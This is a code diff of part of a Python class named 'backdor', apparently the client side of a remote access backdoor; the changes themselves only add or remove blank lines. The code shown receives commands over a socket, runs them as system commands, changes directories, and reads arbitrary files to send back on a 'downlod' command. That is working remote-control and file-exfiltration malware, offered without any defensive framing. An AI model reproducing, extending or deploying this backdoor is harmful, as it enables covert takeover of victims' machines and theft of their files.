@@ -18,11 +18,13 @@ class backdor:
         except subprocess.CalledProcessError:
             return f"Command '{commnd}' returned non-zero exit status 1".encode("utf-8")
         
+
     def command_send(self, deta):
         '''define a function in this function send data in server client'''
         json_data = json.dumps(deta)
         encode_data = json_data.encode("utf-8")
         self.connected.send(encode_data)
+
 
     def command_receive(self):
         '''receive command use this function'''
@@ -36,10 +38,12 @@ class backdor:
         os.chdir(path)
         return os.getcwd()
 
+
     def read_file(self, file_path):
         '''this function use to open a txt file use to binary mode'''
         with open(file_path, "rb") as bin:
             return bin.read()
+
 
     def run(self):
         '''this function use to run all auto function'''
@@ -64,7 +68,6 @@ class backdor:
             
             elif comd[0]=="downlod":
                 self.system_data = self.read_file(comd[1])
-       
 
             else:
                 self.system_data = self.use_for_system_command(comd[0])
